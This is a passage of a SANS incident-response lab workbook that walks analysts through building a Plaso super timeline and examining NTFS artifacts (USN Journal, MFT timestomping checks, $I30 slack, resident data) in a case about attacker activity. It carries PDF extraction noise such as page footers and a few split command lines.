cd SRL-Data/Disk-Images
ls -lh

Example

5. The .E01 extension signiﬁes an Expert Witness compressed image ﬁle. Although log2timeline.py can directly parse
compressed E01 disk images, we would like to expose the rd01-c-drive.E01 compressed image ﬁle as an uncompressed

.

raw disk image and parse that instead. (We have found that it runs a little faster).
ewfmount rd01-c-drive.E01 /mnt/ewf_mount/
cd /mnt/ewf_mount
ls -lh

Now that we have what appears to be a 64-GB raw disk image, we'll use that as our parsing target.
6. In this lab, we're going to leverage a yaml-based ﬁlter ﬁle. This is a feature of log2timeline to read the ﬁle and only process
the ﬁles and directories speciﬁed by the ﬁle. This can speed up processing by orders of magnitude, especially when
incorporating volume shadow copies.
Before processing the image, examine the ﬁlter ﬁle found in /cases/precooked/timeline/filter_windows.yaml to see what it
is going to target. As you get more advanced with Plaso, updating this ﬁle to suit your needs will become essential to

206

© 2023 SANS Institute

.

increase your eﬃciencies and capabilities. In the meantime, you can use the one in the SIFT, which comes from the Plaso
team at https://github.com/log2timeline/plaso/blob/main/data/ﬁlter_windows.yaml.
cd /cases/cdrive
gedit /cases/precooked/timeline/filter_windows.yaml &

7. Now we will run log2timeline.py to parse both the active forensic artifacts and those found in volume shadow copies. As
discussed (and for the reasons mentioned) in Lab 4.3B, we will be using Docker containers to execute the Plaso tools.

Command line notes
In the log2timeline commands below, we are choosing the following parsers:
In the ﬁrst command:
• --parsers 'win7,!filestat' -- we choose the win7 parser preset and exclude the filestat plugin. The filestat
plugin is not a great option when running log2timeline against selected ﬁles, as we're doing here via the ﬁlter ﬁle.
This plugin is not an MFT parser. It simply extracts the timestamps of the ﬁles which log2timeline parses (i.e., the
relatively small number we are targeting via the ﬁlter ﬁle). Also note that we do not need to specify a time zone
because log2timeline.py runs a preprocessor to detect it when run against a full volume image. (It's a good idea to
verify the time zone setting by running pinfo.py -v against the output plaso database.)
In the second command:
• --parsers 'mactime' -- this parser ingests the body ﬁle information collected from the earlier run of fls in Lab 5.1 Mount and Examine VSS Images. In the second part of that lab, we created a ﬁle system body ﬁle called
dedupe-rd01-vss.body . Also note that an input time zone is not necessary for the

mactime parser since it's

.

processing an NTFS ﬁle system body ﬁle that already has its timestamps in UTC.

log2timeline.py -f /cases/precooked/timeline/filter_windows.yaml --timezone 'EST5EDT' --parsers 'win7,!
filestat' --storage_file /cases/cdrive/rd01-cdrive-vss.plaso /mnt/ewf_mount/ewf1

• When prompted to specify the identiﬁers of the VSS that should be processed, type the following:
1,2

• When prompted to process the current volume, type yes.

© 2023 SANS Institute

.

207

Now add in the active and VSS ﬁle system timeline data created in Lab 5.1 - Mount and Examine VSS Images.
log2timeline.py --parsers 'mactime' --storage-file /cases/cdrive/vss-plaso.dump /cases/precooked/timeline/
dedupe-rd01-vss.body

8. Run psort.py to create the VSS Super Timeline:

.

psort.py --output-time-zone 'UTC' -o l2tcsv -w /cases/cdrive/rd01-vss-plaso.csv /cases/cdrive/rd01-cdrivevss.plaso "(((parser == 'winevtx') and (timestamp_desc == 'Creation Time')) or (parser != 'winevtx')) and
( date > datetime('2023-01-01T00:00:00') AND date < datetime('2023-01-27T00:00:00'))"

208

© 2023 SANS Institute

.

Command line notes
There's a lot to this command. Let's break it down:
• --output-time-zone 'UTC' will create the supertimeline in UTC time.
• -o l2tcsv -w /cases/cdrive/rd01-vss-plaso.csv /cases/cdrive/rd01-cdrive-vss.plaso generates a CSV output
ﬁle named rd01-vss-plaso.csv based on the parsed data in rd01-cdrive-vss.plaso
• "(((parser == 'winevtx') and (timestamp_desc == 'Creation Time')) or (parser != 'winevtx')) and ( date >
datetime('2023-01-01T00:00:00') AND date < datetime('2023-01-27T00:00:00'))" ﬁlters the output for only

"winevtx" Creation Time events, thereby ignoring the "winevtx" Content Modiﬁcation Time events. Furthermore, it
extracts all other parser types, and it ﬁlters everything to the time range of interest for our case.
Note
Technically speaking, the Windows .evtx event log ﬁles contain two timestamps per event: Creation Time and
Content Modiﬁcation Time. The Creation Time is the time when each event is generated and it's stored in the XML
data of the event log entries. In almost every case, this is the only timestamp you will care about when analyzing
Windows event logs. Therefore, we perform noise reduction here by ﬁltering out the extraneous "winevtx" Content
Modiﬁcation Time entries. For more information on the two event log timestamps, see the article "Export corrupts
Windows Event Log ﬁles" at https://blog.fox-it.com/2019/06/04/export-corrupts-windows-event-log-ﬁles/.

9. At the completion of this process, you should have about 2.7M lines in the ﬁnal /cases/cdrive/rd01-vss-plaso.csv ﬁle. (The
exact number of lines will vary based on the version of log2timeline used for parsing.)

.

psort.py

Keep in mind that this is an unﬁltered timeline, other than the speciﬁc time range we applied to the

ﬁlter. In labs

4.3A: Super Timeline Creation - Windows and 4.3B: Super Timeline Creation - Linux, we provided additional ﬁltering options
toward the end. In particular, we provided a PowerShell script to ﬁlter noisy Windows event logs. In many super timelines,
Windows event logs can dominate the timeline.

© 2023 SANS Institute

.

209

Lab 5.3: NTFS File System Forensics
Objectives
• Use MFTECmd to extract and analyze MFT & historical USN Journal data
• Detect "Timestomping" by checking for various timestamp anomalies
• Parse $I30 index slack to ﬁnd prior records of ﬁles in parent directories
• Optional Homework:
• Analyze MFT resident data
• Analyze alternate data streams (ADS)
• Recursively parse $I30 with Velociraptor
• Extract $I30 from a disk image

Lab Preparation
This lab is completed in your 508 Windows VM
1. Launch the 508 Windows VM and log in.
• LOGIN = SANSDFIR
• PASSWORD = forensics
2. Please ensure your evidence is mounted correctly at rd01-triage(E:)

.

G:\SRL_Evidence\triage

If you do not see your evidence mounted, use Windows Explorer to browse to

and double-click on

the ﬁle rd01-triage.vhdx . The image will automatically mount in your 508 Windows VM using the next available drive letter

210

© 2023 SANS Institute

.

(likely E: ). If your image does not mount as drive letter E: , you likely have another device (often USB) attached to your virtual
machine. Consider ﬁxing this, rebooting, and trying again. This lab assumes the triage image is mounted as E: .

Lab Questions
USN Journal Analysis
The USN Journal is one of the most powerful artifacts native to the Windows operating system. It provides a rolling log of ﬁle
system changes, which can be a huge boon when analyzing attacker activity, or other activity of interest. Fortunately, it's also an
artifact that's fairly easy to recover and analyze. We'll use MFTECmd to quickly parse the USN Journal and provide a CSV for
review in Timeline Explorer.
Begin by opening Windows File Explorer and browse to the location of the $J USN Journal ﬁle in the RD01 triage image. Likely
this will be in E:\C\$Extend .

.

Then type cmd.exe in the location bar and hit Enter.

You should now have a Command Prompt in the $Extend directory

Run the following command from the $Extend directory:

© 2023 SANS Institute

.

211

MFTECmd.exe -f $J -m ..\$MFT --csv G:\Labs\ntfs-anti-forensics --csvf usnjrnl-rd01.csv

Note
MFTECmd is able to read in the master ﬁle table to provide additional ﬁle path context. The option -m ..\$MFT speciﬁes to
MFTECmd to use the $MFT from the parent directory. We'll discuss some important aspects of this feature later in the lab.

.

Your output should look similar to the following:

Next we need to open the resulting ﬁle ( G:\Labs\ntfs-anti-forensics\usnjrnl-rd01.csv ) in Timeline Explorer. However, rather
than double-clicking on the CSV, start Timeline Explorer ﬁrst from the Start menu:

212

© 2023 SANS Institute

.

Then choose the Tools menu and update the "Datetime format" to yyyy-MM-dd HH:mm:ss.fffffff (you can copy & paste this

.

value to make it easier).

The default view of Timeline Explorer truncates fractional seconds. However, since the USN Journal can track many rapid ﬁle
system changes within the same second, it can sometimes be useful to see the fractional seconds.
Now choose File > Open and select the ﬁle G:\Labs\ntfs-anti-forensics\usnjrnl-rd01.csv . You're ready to answer the
following questions.
1. How many total events are in RD01's USN Journal? Over what time period do these events occur (i.e., what is the ﬁrst and last
timestamp)?
________________________________________________________________
________________________________________________________________
________________________________________________________________

© 2023 SANS Institute

.

213

Solution
• There were 365,943 events recorded
• These events occurred from 2023-01-23 06:51:25.5665168 UTC through 2023-01-25 17:41:37.7183308 UTC. This
covers approximately 2 days and 11 hours.

2. There are many ways to take advantage of the ﬁle system data logged to the USN Journal. Using existing IOCs is a great

.

start. Another option is more generalized hunting, looking for newly created or deleted executables or scripts. We'll focus our
analysis on existing IOCs. A very important one is the C:\Windows\Update attacker directory. We can setup a ﬁlter to review
ﬁles and folders changed within the C:\Windows\Update directory. To do so, apply the ﬁlter .\Windows\update to the "Parent
Path" column.
Do you see any ﬁles or directories we had not yet discovered through prior analysis?

214

© 2023 SANS Institute

.

Note
The column layout for most of the screenshots has been adjusted to show the following columns ﬁrst. You can drag and
drop the column headers to make similar adjustments on your system.
• Update Timestamp
• Parent Path
• Name
• File Attributes
• Entry Number
• Parent Entry Number
• Update Reasons

________________________________________________________________

.

________________________________________________________________

© 2023 SANS Institute

.

215

Solution
• Yes!
• There is one ﬁle that we have not yet discovered in any of our prior analysis: d.svb . Furthermore, it appears to be
related to another ﬁle right next to it named d.ger . You might recall that we caught a brief glimpse of d.ger during
Windows Defender log analysis.
• It also may appear that d.reg and d.vbs are new ﬁles, but hold that thought. We'll analyze those entries
momentarily.
• All the other ﬁles and directories have been observed via prior artifact analysis throughout the course. However, we are

.

getting additional context here about changes to them over time, which is great!

3. For the new ﬁles observed in C:\Windows\Update , what activity is the USN Journal recording? What is the end result?
________________________________________________________________
________________________________________________________________
________________________________________________________________
Hint
It's probably pretty apparent without any changes to your view, but you can add a ﬁlter for each ﬁle's MFT Entry Number in
the column ﬁlter. For example:

216

© 2023 SANS Institute

.

Solution
• The USN Journal is recording ﬁle renames and then deletes:
• d.ger was renamed to d.reg (MFT entry number 29085)
• d.svb was renamed to d.vbs (MFT entry number 37274)
• 11-12 minutes later, each ﬁle was deleted.

4. The creation of these ﬁles is not shown in the current view. Can you ﬁnd evidence of when and where these ﬁles were created?
If so, can you determine when they were moved to the current directory?
________________________________________________________________

.

________________________________________________________________
Hint (and pro tip)
If they were created in a directory other than \Windows\Update , we wouldn't see it with the current ﬁlter. Continue to ﬁlter
for one of the two ﬁles via their MFT "Entry Number", but delete the "Parent Path" ﬁlter.
This will lead to several hundred events in the new view. It's not too many to scroll through, but here's a pro tip:
• To focus on a speciﬁc ﬁle, ﬁlter not only on the ﬁle's MFT Entry Number, but also the Sequence Number for that ﬁle.
When you ﬁlter on the MFT Entry Number alone, you still see a lot of activity. That's because many ﬁles are short-lived.
Windows reuses MFT entries quickly after they are marked unused (deleted) to prevent the MFT from growing. Each
time an MFT entry is reused, its sequence number is incremented. But for a given ﬁle, the entry number and the
sequence number remain constant. Therefore, we can track a speciﬁc ﬁle's use of an MFT entry by both its "Entry
Number" and the "Sequence Number". Here's an example for d.svb with Entry Number 37274 and Sequence Number
74:

© 2023 SANS Institute

.

217

Solution
These ﬁles were created on 2023-01-23 at 18:32 UTC in the C:\Windows directory. Approximately two minutes later, they
were moved from C:\Windows to C:\Windows\Update . From that location, we picked up on their presence by searching for

.

activity in the attacker's directory.

Note
The way the USN Journal ﬂags a directory move is a little odd. You see a "RenameOldName" event followed by a
"RenameNewName". We also saw this same pattern when the ﬁles were renamed, which makes more sense. Using the
same update reason codes for a directory change is not exactly as obvious, but once you know this pattern, it is
simple to spot directory changes as well as name changes!

5. Clear all your ﬁlters using CTRL-E and add back the ﬁlter for just "Parent Path" contains .\Windows\Update . You should see
40 events with this ﬁlter. How many involve changes to directories? What are those changes?
________________________________________________________________
________________________________________________________________
________________________________________________________________

218

© 2023 SANS Institute

.

Solution
• 6 of changes C:\Windows\Update are related to directories
• In all 6 cases, we see the directory being deleted. This occurs over about a 35 minute time period on 2023-01-23.
• Filtering for "File Attribute" contains Directory helps us focus on these events.

6. One of the directories was named rec . Can you determine what the contents were of that directory?
________________________________________________________________
________________________________________________________________
________________________________________________________________
Hint
A logical approach might be to use a ﬁlter of .\Windows\Update\rec\ in the "Parent Path" column. In theory, this would

.

show any ﬁles in that path. However, if you do that, you'll get zero results. Why is that?

It is because the rec directory was deleted and the "Parent Path" is generated from a current copy of the $MFT. This is the
result of using -m ..\$MFT in our MFTECmd command. Since rec is deleted in the current $MFT, MFTECmd can't tie any
children to that parent directory. However, the data we need to list the children is stored in the USN Journal. To list the
children, you need to ﬁlter on the "Parent Entry Number" instead of the "Parent Path". The parent MFT number is stored in
each journal record, so it's always available to ﬁlter and pivot on.

© 2023 SANS Institute

.

219

Solution
There were 10 ﬁles in that directory. Most were text ﬁles, along with a couple of batch scripts. Notice from the results that
the "Parent Path" is marked .\PathUnknown\ . That's because the current $MFT that was used by MFTECmd to build this
column does not know about the rec folder, since it was deleted. Therefore, we need to ﬁlter with the MFT entry number of

.

the rec folder as the "Parent Entry Number" instead.

Note
You may recall that we were able to discover the \Windows\Update\rec folder and ﬁles during the volume shadow
analysis in Lab 5.1. That is one option to discover older ﬁles on the ﬁle system, but it is always good to have multiple
options. It is certainly possible the ﬁles were created and deleted before a snapshot had been created, and therefore, a
volume shadow copy would not help. On the other hand, the USN Journal typically only goes back a couple of days, so
in that scenario, looking in volume shadow copies could be the better bet.
To get maximum visibility, remember that volume shadows maintain their own copy of previous USN Journals, so that
is yet another way to pull the thread to dig even deeper!

Timestomping Identification
A critical part of responding to incidents is discovering the root cause. How did the incident begin? Answering that question
involves pursuing many leads to work our way back to the start. In digital forensics, one of the more important clues we rely on
are the timestamps of attacker-created ﬁles.

220

© 2023 SANS Institute

.

In the Stark Research Labs case, the ﬁrst attacker-related ﬁle we uncovered was the persistent malware named STUN.exe .
Something unusual about that ﬁle which we haven't ﬁgured out yet is why or how was it created in 2021? That's signiﬁcantly
earlier than any other artifacts we've encountered. If that's an accurate time, then our investigation needs to expand greatly. Let's
take a closer look at STUN.exe to determine if it has reliable timestamps, or if instead, the attackers may have backdated it (aka
"timestomped" it).
1. Check for File Creation in USN Journal
Since we have the USN Journal open, we should review it for activity related to STUN.exe . If we're lucky, we'll even see the
journal's recording of that ﬁle being created.
Clear all ﬁlters with CTRL-E and then search for "Name" contains STUN.exe . What type of activity do you ﬁnd for this ﬁle (if
any)?
________________________________________________________________
________________________________________________________________
Solution
Unfortunately we don't see the creation time. That would have made things easy! Instead, there are two entries at the same
time, 2023-01-23 18:52:36.5038849. Both have the update reason is "BasicInfoChange". This is a change related to the
ﬁle's metadata, which can include timestamps.

.

2. Check for SI-FN Anomaly with MFTECmd
The original tell-tale sign for detecting a timestamp being backdated was to compare the ﬁle's $STANDARD_INFORMATION
timestamps with the $FILE_NAME timestamps, and in particular, the creation timestamps. Windows updates these two sets
of timestamps in very different ways. However, a creation time should not differ in theory, since a ﬁle is created once and there
should be no further change. In practice though, we've seen these creations timestamps differ more regularly, even for
legitimate ﬁles. Nevertheless, it is still a data point worth checking.
In Lab 4.2: Filesystem Timeline Creation, we created a ﬁle system timeline in "bodyﬁle" format and then sorted and ﬁltered it
(by time) with mactime . That works well, but it leaves out a lot of useful information found in the $MFT. MFTECmd can pull
out this extra context when outputting to CSV rather than bodyﬁle. Let's run it again to review the expanded CSV version.
In your CMD window, run the following command (assuming the RD01 triage image is mounted to E: ):
MFTECmd.exe -f E:\C\$MFT --csv G:\Labs\ntfs-anti-forensics --csvf mft-rd01.csv

© 2023 SANS Institute

.

221

Tip
By default, MFTECmd does not display $FILE_NAME timestamps if they match the $STANDARD_INFORMATION
timestamps. This can help spot differences, although some people prefer to see all the timestamps whether they match or
not. If you want to see all timestamps in the output, add the option --at . We recommend trying it without this option
initially.

When ﬁnished, the result should look similar to the following.

.

Open the resulting CSV with Timeline Explorer:

222

© 2023 SANS Institute

.

Now add a ﬁlter for "File Name" containing STUN.exe . There are a LOT of ﬁelds parsed out by MFTECmd that are available in
the CSV. Scroll all the way to the right to see several anomaly checks performed by MFTECmd. Notice there's a checkmark for
"SI<FN":

This check is the result of comparing the $STANDARD_INFORMATION (SI) time with the $FILE_NAME (FN) time. If the SI time
is less than the FN time, it could be an indicator of backdating. That is because the Windows API to change a timestamp will
only change the SI time. So in that case, the FN time is the original time and the SI is some time prior (generally trying to
blend in with the legitimate system ﬁles). Unfortunately, this alone is a low ﬁdelity validation because Windows creates many
of these "anomalies" during the installation process. Still, it can be worth a check. In this case, have a look at the creation
times in particular.
• What are the $STANDARD_INFORMATION creation & modiﬁcation times? (Note: the $SI Attribute Type is 0x10 )
________________________________________________________________
• What are the $FILE_NAME creation & modiﬁcation times? (Note: the $FN Attribute Type is 0x30 )
________________________________________________________________
• Is the $STANDARD_INFORMATION creation time prior to the $FILE_NAME creation time? If so, what does this imply?
________________________________________________________________
________________________________________________________________

.

Solution

• The $STANDARD_INFORMATION creation & modiﬁcation times are both 2021-06-05 12:05:12 UTC.
• The $FILE_NAME creation & modiﬁcation times are both 2023-01-17 15:44:25 UTC.
• Yes, the $STANDARD_INFORMATION creation time is prior to the $FILE_NAME creation time. By itself, this is not
enough to conclude that the ﬁle has been intentionally backdated. However, it is an indicator that it could have
been.
It's also a little more suspicious because the $FN time is within the timeframe of attacker activity. If you remove
the ﬁlter for "File Name" contains STUN.exe and toggle the box on the "SI<FN" column header to display only
those ﬁles, you'll see over 101,000 rows. Clearly a lot of potential false positives! However, only 1598 have a time
that was not on 2022-08-31. So, STUN.exe is deﬁnitely an outlier.

© 2023 SANS Institute

.

223

Compare M-Time with AppCompatCache and AmCache

We have discussed several important "Evidence of Execution" artifacts that help to identify the presence of malicious binaries.
Two of those artifacts, ShimCache (aka AppCompatCache) and AmCache, happen to log the modiﬁcation timestamp of the
binary when they are ﬁrst detected. This can be very helpful if we're looking for evidence of an attacker later backdating a
piece of malware to blend in.
For this comparison, leverage the super timeline, since it includes both AppCompatCache and AmCache. If you don't already
have it open, ﬁnd a copy at G:\Precooked\timeline\rd01-supertimeline.csv and open it with Timeline Explorer.
Press CTRL-E to clear any ﬁlters that may be enabled. Filter in "Long Description" for stun.exe . You should see just 8 visible
lines. The ﬁrst one likely has a Source Name of "AMCACHE". What is the timestamp for that entry?
________________________________________________________________

.

3.

224

© 2023 SANS Institute

.

Solution
• 2023-01-13 19:39:19 UTC

• Interesting! The ﬁrst time AmCache discovered and logged STUN.exe , it had a last modiﬁcation time from
2023-01-13. However, the ﬁle on the active ﬁle system reports a last modiﬁcation time from 2021-06-05. Keep in mind
that binaries are not typically modiﬁed. Even when they are, would it be normal to have the ﬁle modiﬁed with an older
timestamp? Certainly not!
• Even if it had been modiﬁed, then by deﬁnition, the hash of the ﬁle should change. We get bonus visibility with
AmCache in the fact that it records the SHA1 hash of the ﬁle at the time it ﬁrst sees it. Let's compare the SHA1 hash
of the current ﬁle with the older 2021 timestamps with the SHA1 hash from AmCache with a 2023 last modiﬁcation
time. We'll do it quickly with a couple of command lines. Open a PowerShell window and run the following:
With PowerShell, we can import the AmCache unassociated ﬁle entries (i.e., not associated with an packaged installer)
and search for the stun.exe and it's SHA1 hash logged by AmCache:
Import-Csv G:\Precooked\execution\amcache_UnassociatedFileEntries.csv | Where-Object { $_.Name -eq
'stun.exe' } | Select-Object Name,SHA1

Next, let's compare that value with the SHA1 hash of stun.exe collected in our triage image (assuming it is mounted
on E: ):

.

Get-FileHash -algo SHA1 E:\C\Windows\System32\STUN.exe

Do they match?

© 2023 SANS Institute

.

225

Solution
Yes, they should match with SHA1 hash value 407e7c91fbfa9b8e83cf377bb78ac63e6258bc60. This is a clear
indicator that the executable did not change, despite differing last modiﬁcation timestamps.
Expected results

PS G:\> Import-Csv G:\Precooked\execution\amcache_UnassociatedFileEntries csv
Where-Object { $_ Name -eq 'stun.exe' }
Select-Object Name SHA1
Name

SHA1

STUN

407e7c91fbfa9b8e83cf377bb78ac63e6258bc60

PS G:\> Get-FileHash -algo SHA1

:\C\Windows\System32\STUN ex

Algorithm Hash

Path

SHA1
407E7C91FBFA9B8E83CF377BB78AC63E6258BC60 E
\C\Windows\System32\STUN exe

4. Compare with Executable Compile Time
Here's another quick check. The ﬁle types that attackers typically attempt to backdate are binaries and scripts. They change
the times to blend in with other legitimate binaries and scripts. The nice thing about binaries is that they include embedded
metadata, usually with a compile time. Attackers often custom-compile malware for a target organization in order to armor it

.

to avoid AV detection, and/or to embed custom C2 server information. That process may generate a compile time that is
around the time of the attack. Let's check the compile time for stun.exe and see if it would make sense with the current ﬁle's
timestamps.
In a CMD or PowerShell window, run the following command (assuming it is mounted on E: ):
exiftool E:\C\Windows\System32\STUN.exe

With exiftool , the compile time is labeled simply "Time Stamp". Do you see a mismatch that might indicate timestomping?

226

© 2023 SANS Institute

.

Solution
• Indeed, we see another timestamp anomaly indicating probable backdating.
• exiftool reports a compile time of 2023:01:13 19:39:19 UTC. That's right in line with the attacker activity we've
discovered so far, and quite different from the much older creation time of the ﬁle on the disk (2021-06-05 12:05:12
UTC).
Expected results

PS G:\> exiftool E:\C\Windows\System32\STUN.exe
ExifTool Version Number
: 12.43
File Name
: STUN.exe
Directory
: E:/C/Windows/System32
File Size
: 649 kB
File Modification Date/Time
: 2021:06:05 12:05:12+00:00
File Access Date/Time
: 2023:07:22 15:09:04+00:00
File Creation Date/Time
: 2021:06:05 12:05:12+00:00
File Permissions
: -r--r--r-File Type
: Win64 EXE
File Type Extension
: exe
MIME Type
: application/octet-stream
Machine Type
: AMD AMD64

Time Stamp

: 2023:01:13 19:39:19+00:00
: Executable, No line numbers, Large address aware
: PE32+
: 2.36
: 68608
: 367104
: 3584
: 0x14e0
: 4.0
: 0.0
: 5.2
: Windows command line

.

Image File Characteristics
PE Type
Linker Version
Code Size
Initialized Data Size
Uninitialized Data Size
Entry Point
OS Version
Image Version
Subsystem Version
Subsystem

We've completed several checks to look for signs of the attacker backdating stun.exe . Each check, other than the looking for its
creation in USN Journal, adds to the evidence that this ﬁle was indeed backdated to try to blend in with other ﬁles in

C:

\Windows\System32 .

If some of those checks were inconclusive, there are other options. Some other ideas include checking for $I30 slack entries that
may have the original timestamps, reviewing volume shadow copy ﬁle system timestamps and USN Journals, and even carving
for NTFS records (which we discuss in the ﬁnal lab).

© 2023 SANS Institute

.

227

Review $I30 for Directories of Interest
We'll end the main part of the lab with a deep-dive NTFS forensic analysis technique. As discussed in the course, each directory on
an NTFS ﬁle system maintains its own list of the ﬁles and subdirectories within it. This is largely for performance reasons. It's
much faster to search this per-directory "list" than to scan the MFT for parent-child relationships. The beneﬁt from a forensics
perspective is it gives us another location to look for ﬁles that were once in a directory of interest. That's because when a ﬁle or
directory is deleted, the entry in its parent's B-tree list may not get deleted right away. So, we can look for "slack" entries in the
directory B-tree index.
This deﬁnitely is a deep-dive technique. Generally speaking, it requires access to the full disk. To make things quicker in this main
part of the lab, we've exported out the $I30 index buffers from one directory of interest: C:\Windows . You will parse the exported
$I30 ﬁle using Joakim Schicht's Indx2Csv tool. Later in an optional section of the lab, we cover how to access these $I30 ﬁles
directly from the disk and additional parsing options using Velociraptor.

Note
We introduce Joakim Schict's Indx2Csv because it is especially good at recovering partial slack entries in $I30 ﬁles. Slack
entries may get overwritten by newer active entries. However, if enough of the old data is still present in the $I30, then some
index parsers are able to display even the partial entries.
That said, MFTECmd can also parse standalone $I30 ﬁles and does it quite well (no surprise!). The command line is simple to
run. For example, the following command gives essentially the same results as running Indx2Csv:
mftecmd -f G:\Precooked\ntfs-anti-forensics\I30-Windows --csv G:\Labs\ntfs-anti-forensics --csvf i30-winmftecmd.csv

.

1. In your Windows VM, double-click on Indx2Csv64 in the "NTFS Tools" fence on the desktop (or locate it in C:
\Forensic_Program_Files\joakim_schicht\Indx2Csv-master ). Then do the following:

a. Click "Change Output" and browse to G:\Labs\ntfs-anti-forensics
b. Click "Browse INDX" and choose I30-Windows from G:\Precooked\ntfs-anti-forensics
c. Change "Set separator" from the pipe | to a comma ,
d. Select "Dump everything"
e. Click "Start Parsing"
f. After a few seconds parsing, Indx2Csv should have completed and found 167 entries.

228

© 2023 SANS Institute

.

2. The tool should now have written several ﬁles to G:\Labs\ntfs-anti-forensics . Use Timeline Explorer to open the ﬁle named
in the format of Indx_I30_Entries_<timestamp>.csv (it should be 35 KB in size).
When reviewing the $I30 index data, we generally only care about the "slack" entries. Non-slack entries are allocated ﬁles. As
such, we have better ways of analyzing their ﬁlesystem data, such as via $MFT data.
Add a ﬁlter of 1 in the "From Indx Slack" column so that you're only seeing the slack entries.

.

C:\Windows

Remember that the $I30 we parsed came from RD01's

directory. So you are seeing a list of ﬁles and folders that

were either deleted, or are still allocated, yet an older entry resides in the index due to shuﬄing entries during B-tree

© 2023 SANS Institute

.

229

rebalancing. For active directories (those with a lot of adds and deletes), the rebalancing happens frequently. For less-active
directories, the rebalancing may not occur often at all.
• How many slack entries were discovered by using Indx2Csv ?
________________________________________________________________
Solution
• 39 slack entries are available in the C:\Windows $I30 directory index.

3. Similar to C:\Windows\System32 , attackers sometimes try to hide their malware in

C:\Windows in an attempt to blend in with

legitimate ﬁles. Do you see any signs of suspicious executables or scripts in the slack entries?
________________________________________________________________

Hint
Many of the entries are for directories. You can remove those entries out by scrolling to the right and adding a ﬁlter for the

.

"File Flags" column for Does not contain "directory".

Solution
No, there are just a few ﬁles in total. 3 are processes and DLLs normally found in C:\Windows : winhlp32.exe , write.exe ,
and twain_32.dll ). Another ﬁle has an unusual extension and potentially worth review: WmSysPr9.prx . However, a little
research ﬁnds that this is a normal ﬁle that maintains proﬁle information in an XML ﬁle with a .prx extension (per
Microsoft documentation at https://for508.com/zkush).
4. Do any other ﬁles look suspicious? If so, take note of their ﬁle system timestamps.
________________________________________________________________
________________________________________________________________

230

© 2023 SANS Institute

.

Note
The use of timestamp abbreviations is different for Joakim Schicht's tools than what we use in class. His abbreviations
are described in the tool's Github repo at https://github.com/jschicht/Indx2Csv. Here they are for quick reference:
• CTime means File Create Time
• ATime means File Modiﬁed Time
• MTime means MFT Entry modiﬁed Time
• RTime means File Last Access Time

Solution
• Yes, there are 4 entries that have signs of ﬁle wiping. We will discuss this topic in the ﬁnal module of the course, but we
get a glimpse of it here with the following entries:
• LLLLLL~1.LLL
• LLLLLL~1.LLL
• ZZZZZZZZZZZZZZZZ.ZZZZZZZZZZ.ZZZ.ZZZ
• ZZZZZZ~1.ZZZ
• All of these entries have timestamps within the window of attacker activity we've tracked so far. For all 4 ﬁles, the

.

creation times (CTime) were on 2023-01-17 and the other timestamps were on 2023-01-23.

Analyzing slack entries in $I30 directory indexes is yet another useful technique for digging deep into the NTFS ﬁle system. As
incident responders and forensic analysts, we are fortunate to have so many ways to looks for unusual activity on Windows
systems.

Optional - Analyze MFT Resident Data
A performance feature of NTFS is to make use of free space in Master File Table entries to store small ﬁles. This prevents the need
to pull the metadata information about a ﬁle from one place (the $MFT) and access the ﬁle's data from another (a cluster on the
volume). This only works for very small ﬁles--approximately 700 bytes or less on most systems. (Most Windows systems have an
MFT that uses 1024-byte entries, but they can be larger, such as 4096 bytes per entry.) Although 700 bytes seems quite small (and
it is), it turns out that there are typically a lot of ﬁles in Windows that ﬁt within that size limit. Therefore, a lot of ﬁle data can be
recovered from a $MFT ﬁle.

© 2023 SANS Institute

.

231

As we've seen throughout this lab, MFTECmd is a powerful and versatile tool. Yet another great feature is its ability to extract
resident ﬁles from an $MFT ﬁle. This can be done with the --dr option. For every MFT entry that includes resident data, it will
extract it to a ﬁle in the directory speciﬁed by the --csv <directory> option. The output ﬁles will be in the format of
<EntryNumber>-<SequenceNumber>_<FileName>.bin .

Let's create a new output directory to hold the resident data:
mkdir G:\Labs\ntfs-anti-forensics\mftecmd-resident-data

Now let's rerun MFTECmd with this --dr option. The following command assumes the RD01 triage image is mounted to the E:
drive.
mftecmd.exe -f E:\C\$MFT --dr --csv G:\Labs\ntfs-anti-forensics\mftecmd-resident-data --csvf mft-rd01-dr.csv

Note
Notice that we are using the $MFT from the triage image. We do not need the full disk image to leverage this capability. We
just need to acquire the target $MFT .
Also, we've given the output ﬁle a different name from the earlier run of MFTECmd, but the output CSV will include the same
content. The only difference in this case is the additional dumping of resident data to the

mftecmd-resident-data directory.

In File Explorer, browse to the new G:\Labs\ntfs-anti-forensics\mftecmd-resident-data\Resident directory and review the
contents. Quite a collection!
1. How many ﬁles were created from dumping the MFT resident data?

.

________________________________________________________________

232

© 2023 SANS Institute

.

Solution
75,238 ﬁles!

2. With so many ﬁles, it can be a little daunting to review. There are a variety of things that can be done with the dumped ﬁles.
Certainly, if you are looking for a speciﬁc ﬁle that was resident in the MFT, then you can search for it by ﬁle name or MFT
number. Or even speciﬁc ﬁle types. For example, there are two ﬁles that end in .csv (although technically .csv.bin since

Hint for ﬁnding the ﬁles

.

MFTEcmd adds .bin to the dumped ﬁles). What can you determine about the status of those ﬁles?

From a CMD window in the G:\Labs\ntfs-anti-forensics\mftecmd-resident-data\Resident directory, you could list
them with *.csv.bin glob pattern.

© 2023 SANS Institute

.

233

Solution
Run the following from a CMD window:
dir G:\Labs\ntfs-anti-forensics\mftecmd-resident-data\Resident\*.csv.bin

Expected results

C:\Users\sansdfir>dir G:\Labs\ntfs-anti-forensics\mftecmd-resident-data\Resident\*.csv.bin
Volume in drive G is Cases
Volume Serial Number is 5CE2-B751
Directory of G:\Labs\ntfs-anti-forensics\mftecmd-resident-data\Resident
07/23/2023 01:17 AM
501 337872-21_$R2T2A0E.csv.bin
07/23/2023 01:17 AM
98 338767-11_$I2T2A0E.csv.bin
2 File(s)
599 bytes
0 Dir(s) 446,130,343,936 bytes free

These appear to be Recycle Bin ﬁles. The $R ﬁle is the recycled ﬁle and the $I ﬁle includes information about the original
ﬁle name and location and when the ﬁle was recycled. Run rbcmd.exe on the $I ﬁle to pull out the original path
information out:

.

rbcmd.exe -f G:\Labs\ntfs-anti-forensics\mftecmd-resident-data\Resident\338767-11_$I2T2A0E.csv.bin

234

© 2023 SANS Institute

.

Expected results

G:\>rbcmd.exe -f G:\Labs\ntfs-anti-forensics\mftecmd-residentdata\Resident\338767-11_$I2T2A0E.csv.bin
RBCmd version 1.5.0.0
Author: Eric Zimmerman (saericzimmerman@gmail.com)
https://github.com/EricZimmerman/RBCmd
Command line: -f G:\Labs\ntfs-anti-forensics\mftecmd-residentdata\Resident\338767-11_$I2T2A0E.csv.bin
Found 1 files. Processing...
